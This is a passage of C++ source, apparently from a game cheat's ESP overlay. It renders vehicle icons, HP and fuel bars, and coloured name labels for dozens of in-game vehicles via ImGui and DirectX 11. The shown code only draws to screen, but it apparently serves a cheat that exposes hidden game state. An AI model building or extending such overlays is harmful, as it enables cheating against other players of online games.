													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 56, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 56.00f, 5.0, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_Bike_Color[0], Setting::vahicle_Text_item_Bike_Color[1], Setting::vahicle_Text_item_Bike_Color[2], Setting::vahicle_Text_item_Bike_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Bike_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_ATV2 && Vehicle.Name == u8"ATV")
											{
												if (Setting::vahicle_Text_item_ATV2_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::ATV2, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::ATV2, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 52, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 52.00f, 5.0, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_ATV2_Color[0], Setting::vahicle_Text_item_ATV2_Color[1], Setting::vahicle_Text_item_ATV2_Color[2], Setting::vahicle_Text_item_ATV2_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_ATV2_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}


										}
										else if (VehicleStyle == 2)
										{
											if (Setting::vahicle_Text_item_Plane && Vehicle.Name == u8"Air Plane")
											{

												if (Setting::vahicle_Text_item_Plane_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Plane, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Plane, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_Plane_Color[0], Setting::vahicle_Text_item_Plane_Color[1], Setting::vahicle_Text_item_Plane_Color[2], Setting::vahicle_Text_item_Plane_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Plane_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);

												continue;
											}
											if (Setting::vahicle_Text_item_SnowBoard && Vehicle.Name == u8"SnowBoard")
											{

												if (Setting::vahicle_Text_item_SnowBoard_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::SnowBoard, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::SnowBoard, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_SnowBoard_Color[0], Setting::vahicle_Text_item_SnowBoard_Color[1], Setting::vahicle_Text_item_SnowBoard_Color[2], Setting::vahicle_Text_item_SnowBoard_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_SnowBoard_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);

												continue;
											}
											if (Setting::vahicle_Text_item_Helicopter && Vehicle.Name == u8"Helicopter")
											{

												if (Setting::vahicle_Text_item_Helicopter_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Helicopter, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Helicopter, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_Helicopter_Color[0], Setting::vahicle_Text_item_Helicopter_Color[1], Setting::vahicle_Text_item_Helicopter_Color[2], Setting::vahicle_Text_item_Helicopter_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Helicopter_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);

												continue;
											}
											if (Setting::vahicle_Text_item_Snowmobile && Vehicle.Name == u8"Snowmobile")
											{

												if (Setting::vahicle_Text_item_Snowmobile_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Snowmobile, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Snowmobile, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}

												if (Setting::hp)
												{
													std::string fuel;

													fuel.append("Fuel:").append(std::to_string((int)(Vehicle.oil)).append("% - HP:").append(std::to_string((int)(Vehicle.hp)).append("%")));
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
												}

												if (Setting::feul)
												{
													if (Vehicle.driving)
													{
														color = DX11::ImGui_DX11::Color::Red;
													}
													else {
														color = ImColor(Setting::vahicle_Text_item_Snowmobile_Color[0], Setting::vahicle_Text_item_Snowmobile_Color[1], Setting::vahicle_Text_item_Snowmobile_Color[2], Setting::vahicle_Text_item_Snowmobile_Color[3]);
													}

													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Snowmobile_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												}
												continue;
											}
											if (Setting::vahicle_Text_item_BRDM && Vehicle.Name == u8"BRDM")
											{

												if (Setting::vahicle_Text_item_BRDM_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::BRDM, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::BRDM, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}

												if (Setting::hp)
												{
													std::string fuel;

													fuel.append("Fuel:").append(std::to_string((int)(Vehicle.oil)).append("% - HP:").append(std::to_string((int)(Vehicle.hp)).append("%")));
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
												}

												if (Setting::feul)
												{
													if (Vehicle.driving)
													{
														color = DX11::ImGui_DX11::Color::Red;
													}
													else {
														color = ImColor(Setting::vahicle_Text_item_BRDM_Color[0], Setting::vahicle_Text_item_BRDM_Color[1], Setting::vahicle_Text_item_BRDM_Color[2], Setting::vahicle_Text_item_BRDM_Color[3]);
													}

													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_BRDM_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												}
												continue;
											}
											if (Setting::vahicle_Text_item_Capsule && Vehicle.Name == u8"Capsule")
											{
												if (Setting::vahicle_Text_item_Capsule_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Capsule, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Capsule, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{
													std::string fuel;

													fuel.append("Fuel:").append(std::to_string((int)(Vehicle.oil)).append("% - HP:").append(std::to_string((int)(Vehicle.hp)).append("%")));
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
												}

												if (Setting::feul)
												{
													if (Vehicle.driving)
													{
														color = DX11::ImGui_DX11::Color::Red;
													}
													else {
														color = ImColor(Setting::vahicle_Text_item_Capsule_Color[0], Setting::vahicle_Text_item_Capsule_Color[1], Setting::vahicle_Text_item_Capsule_Color[2], Setting::vahicle_Text_item_Capsule_Color[3]);
													}

													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Capsule_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												}
												continue;
											}
											if (Setting::vahicle_Text_item_Coupe && Vehicle.Name == u8"Coupe")
											{
												if (Setting::vahicle_Text_item_Coupe_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Coupe, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Coupe, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{
													std::string fuel;

													fuel.append("Fuel:").append(std::to_string((int)(Vehicle.oil)).append("% - HP:").append(std::to_string((int)(Vehicle.hp)).append("%")));
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
												}

												if (Setting::feul)
												{
													if (Vehicle.driving)
													{
														color = DX11::ImGui_DX11::Color::Red;
													}
													else {
														color = ImColor(Setting::vahicle_Text_item_Coupe_Color[0], Setting::vahicle_Text_item_Coupe_Color[1], Setting::vahicle_Text_item_Coupe_Color[2], Setting::vahicle_Text_item_Coupe_Color[3]);
													}

													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Coupe_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												}
												continue;
											}
											if (Setting::vahicle_Text_item_UTV && Vehicle.Name == u8"UTV")
											{
												if (Setting::vahicle_Text_item_UTV_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::UTV, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::UTV, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{
													std::string fuel;

													fuel.append("Fuel:").append(std::to_string((int)(Vehicle.oil)).append("% - HP:").append(std::to_string((int)(Vehicle.hp)).append("%")));
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
												}

												if (Setting::feul)
												{
													if (Vehicle.driving)
													{
														color = DX11::ImGui_DX11::Color::Red;
													}
													else {
														color = ImColor(Setting::vahicle_Text_item_UTV_Color[0], Setting::vahicle_Text_item_UTV_Color[1], Setting::vahicle_Text_item_UTV_Color[2], Setting::vahicle_Text_item_UTV_Color[3]);
													}

													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_UTV_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												}
												continue;
											}
											if (Setting::vahicle_Text_item_ATV2 && Vehicle.Name == u8"ATV")
											{
												if (Setting::vahicle_Text_item_ATV2_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::ATV2, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::ATV2, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{
													std::string fuel;

													fuel.append("Fuel:").append(std::to_string((int)(Vehicle.oil)).append("% - HP:").append(std::to_string((int)(Vehicle.hp)).append("%")));
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
												}

												if (Setting::feul)
												{
													if (Vehicle.driving)
													{
														color = DX11::ImGui_DX11::Color::Red;
													}
													else {
														color = ImColor(Setting::vahicle_Text_item_ATV2_Color[0], Setting::vahicle_Text_item_ATV2_Color[1], Setting::vahicle_Text_item_ATV2_Color[2], Setting::vahicle_Text_item_ATV2_Color[3]);
													}

													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_ATV2_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												}
												continue;
											}
											if (Setting::vahicle_Text_item_SnowBike && Vehicle.Name == u8"SnowBike")
											{
												if (Setting::vahicle_Text_item_SnowBike_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::SnowBike, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::SnowBike, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{
													std::string fuel;

													fuel.append("Fuel:").append(std::to_string((int)(Vehicle.oil)).append("% - HP:").append(std::to_string((int)(Vehicle.hp)).append("%")));
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
												}

												if (Setting::feul)
												{
													if (Vehicle.driving)
													{
														color = DX11::ImGui_DX11::Color::Red;
													}
													else {
														color = ImColor(Setting::vahicle_Text_item_SnowBike_Color[0], Setting::vahicle_Text_item_SnowBike_Color[1], Setting::vahicle_Text_item_SnowBike_Color[2], Setting::vahicle_Text_item_SnowBike_Color[3]);
													}

													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_SnowBike_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												}
												continue;
											}
											if (Setting::vahicle_Text_item_Bike && Vehicle.Name == u8"Bike")
											{
												if (Setting::vahicle_Text_item_Bike_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Bike, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Bike, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{
													std::string fuel;

													fuel.append("Fuel:").append(std::to_string((int)(Vehicle.oil)).append("% - HP:").append(std::to_string((int)(Vehicle.hp)).append("%")));
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
												}

												if (Setting::feul)
												{
													if (Vehicle.driving)
													{
														color = DX11::ImGui_DX11::Color::Red;
													}
													else {
														color = ImColor(Setting::vahicle_Text_item_Bike_Color[0], Setting::vahicle_Text_item_Bike_Color[1], Setting::vahicle_Text_item_Bike_Color[2], Setting::vahicle_Text_item_Bike_Color[3]);
													}

													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Bike_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												}
												continue;
											}
											if (Setting::vahicle_Text_item_PickUpTruck && Vehicle.Name == u8"PickUp Truck")
											{
												if (Setting::vahicle_Text_item_PickUpTruck_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::PickUpTruck, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::PickUpTruck, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{
													std::string fuel;

													fuel.append("Fuel:").append(std::to_string((int)(Vehicle.oil)).append("% - HP:").append(std::to_string((int)(Vehicle.hp)).append("%")));
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
												}

												if (Setting::feul)
												{
													if (Vehicle.driving)
													{
														color = DX11::ImGui_DX11::Color::Red;
													}
													else {
														color = ImColor(Setting::vahicle_Text_item_PickUpTruck_Color[0], Setting::vahicle_Text_item_PickUpTruck_Color[1], Setting::vahicle_Text_item_PickUpTruck_Color[2], Setting::vahicle_Text_item_PickUpTruck_Color[3]);
													}

													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_PickUpTruck_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												}
												continue;
											}
											if (Setting::vahicle_Text_item_Scooter && Vehicle.Name == u8"Scooter")
											{
												if (Setting::vahicle_Text_item_Scooter_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Scooter, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Scooter, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{
													std::string fuel;

													fuel.append("Fuel:").append(std::to_string((int)(Vehicle.oil)).append("% - HP:").append(std::to_string((int)(Vehicle.hp)).append("%")));
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
												}

												if (Setting::feul)
												{
													if (Vehicle.driving)
													{
														color = DX11::ImGui_DX11::Color::Red;
													}
													else {
														color = ImColor(Setting::vahicle_Text_item_Scooter_Color[0], Setting::vahicle_Text_item_Scooter_Color[1], Setting::vahicle_Text_item_Scooter_Color[2], Setting::vahicle_Text_item_Scooter_Color[3]);
													}

													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Scooter_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												}
												continue;
											}
											if (Setting::vahicle_Text_item_Motorcycle && Vehicle.Name == u8"Motorcycle")
											{
												if (Setting::vahicle_Text_item_Motorcycle_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Motorcycle, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Motorcycle, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{
													std::string fuel;

													fuel.append("Fuel:").append(std::to_string((int)(Vehicle.oil)).append("% - HP:").append(std::to_string((int)(Vehicle.hp)).append("%")));
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
												}

												if (Setting::feul)
												{
													if (Vehicle.driving)
													{
														color = DX11::ImGui_DX11::Color::Red;
													}
													else {
														color = ImColor(Setting::vahicle_Text_item_Motorcycle_Color[0], Setting::vahicle_Text_item_Motorcycle_Color[1], Setting::vahicle_Text_item_Motorcycle_Color[2], Setting::vahicle_Text_item_Motorcycle_Color[3]);
													}

													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Motorcycle_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												}
												continue;
											}
											if (Setting::vahicle_Text_item_Motorcycle3 && Vehicle.Name == u8"Motorcycle 3")
											{
												if (Setting::vahicle_Text_item_Motorcycle3_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Motorcycle3, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Motorcycle3, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{
													std::string fuel;

													fuel.append("Fuel:").append(std::to_string((int)(Vehicle.oil)).append("% - HP:").append(std::to_string((int)(Vehicle.hp)).append("%")));
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
												}

												if (Setting::feul)
												{
													if (Vehicle.driving)
													{
														color = DX11::ImGui_DX11::Color::Red;
													}
													else {
														color = ImColor(Setting::vahicle_Text_item_Motorcycle3_Color[0], Setting::vahicle_Text_item_Motorcycle3_Color[1], Setting::vahicle_Text_item_Motorcycle3_Color[2], Setting::vahicle_Text_item_Motorcycle3_Color[3]);
													}

													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Motorcycle3_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												}
												continue;
											}
											if (Setting::vahicle_Text_item_Tuk && Vehicle.Name == u8"Tuk Tuk")
											{
												if (Setting::vahicle_Text_item_Tuk_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Tuk, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Tuk, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{
													std::string fuel;

													fuel.append("Fuel:").append(std::to_string((int)(Vehicle.oil)).append("% - HP:").append(std::to_string((int)(Vehicle.hp)).append("%")));
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
												}

												if (Setting::feul)
												{
													if (Vehicle.driving)
													{
														color = DX11::ImGui_DX11::Color::Red;
													}
													else {
														color = ImColor(Setting::vahicle_Text_item_Tuk_Color[0], Setting::vahicle_Text_item_Tuk_Color[1], Setting::vahicle_Text_item_Tuk_Color[2], Setting::vahicle_Text_item_Tuk_Color[3]);
													}

													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Tuk_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												}
												continue;
											}
											if (Setting::vahicle_Text_item_Buggy && Vehicle.Name == u8"Buggy")
											{
												if (Setting::vahicle_Text_item_Buggy_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Buggy, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Buggy, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{
													std::string fuel;

													fuel.append("Fuel:").append(std::to_string((int)(Vehicle.oil)).append("% - HP:").append(std::to_string((int)(Vehicle.hp)).append("%")));
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
												}

												if (Setting::feul)
												{
													if (Vehicle.driving)
													{
														color = DX11::ImGui_DX11::Color::Red;
													}
													else {
														color = ImColor(Setting::vahicle_Text_item_Buggy_Color[0], Setting::vahicle_Text_item_Buggy_Color[1], Setting::vahicle_Text_item_Buggy_Color[2], Setting::vahicle_Text_item_Buggy_Color[3]);
													}

													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Buggy_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												}
												continue;
											}
											if (Setting::vahicle_Text_item_Sports && Vehicle.Name == u8"Sports")
											{
												if (Setting::vahicle_Text_item_Sports_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Sports, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Sports, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{
													std::string fuel;

													fuel.append("Fuel:").append(std::to_string((int)(Vehicle.oil)).append("% - HP:").append(std::to_string((int)(Vehicle.hp)).append("%")));
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
												}

												if (Setting::feul)
												{
													if (Vehicle.driving)
													{
														color = DX11::ImGui_DX11::Color::Red;
													}
													else {
														color = ImColor(Setting::vahicle_Text_item_Sports_Color[0], Setting::vahicle_Text_item_Sports_Color[1], Setting::vahicle_Text_item_Sports_Color[2], Setting::vahicle_Text_item_Sports_Color[3]);
													}

													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Sports_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												}
												continue;
											}
											if (Setting::vahicle_Text_item_Dacia && Vehicle.Name == u8"Dacia")
											{
												if (Setting::vahicle_Text_item_Dacia_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Dacia, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Dacia, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}

												if (Setting::hp)
												{
													std::string fuel;

													fuel.append("Fuel:").append(std::to_string((int)(Vehicle.oil)).append("% - HP:").append(std::to_string((int)(Vehicle.hp)).append("%")));
